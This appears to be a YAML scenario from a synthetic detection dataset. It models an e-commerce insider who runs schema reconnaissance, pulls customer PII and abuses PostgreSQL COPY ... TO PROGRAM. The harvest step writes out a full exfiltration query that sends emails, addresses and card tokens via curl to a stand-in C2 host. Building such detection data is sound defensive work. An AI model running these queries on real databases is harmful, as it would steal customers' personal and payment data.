scenario_id: ecommerce_lateral_move_0021
family_id: ecommerce_lateral_move_0021
domain: ecommerce
time_of_day: '23:00'
default_class: malicious
rule_engine_relationship: malicious_false_negative
sessions:
- session_label: recon
  role: support_agent
  class: malicious
  anchor: db
  timing:
    tempo: steady
    step_gaps_seconds:
    - 2.496234476270292
  events:
  - sql: SELECT table_name, column_name FROM information_schema.columns WHERE table_schema = 'public'
  - sql: SELECT order_id, total_amount, customer_id FROM orders WHERE total_amount > 1387
  - step_id: probe
    sql: COPY (SELECT 'probe') TO PROGRAM 'cat > /dev/null'
- session_label: harvest
  role: support_agent
  class: malicious
  anchor: db
  delay_after_previous_seconds: 12.179547681080706
  timing:
    tempo: bursty
    step_gaps_seconds:
    - 0.5336859593443771
  events:
  - sql: SELECT email, phone, shipping_address, full_name FROM customers
  - sql: SELECT order_id, total_amount, customer_id FROM orders WHERE total_amount > 1808
  - step_id: exfil
    sql: COPY (SELECT c.email, c.shipping_address, pay.card_token FROM customers c JOIN orders o ON o.customer_id = c.customer_id JOIN payments pay ON pay.order_id = o.order_id) TO PROGRAM 'curl -sX POST
      https://c2.example.net/harvest -d @-'
    connects_to:
      ip: 185.220.101.5
      port: 8443
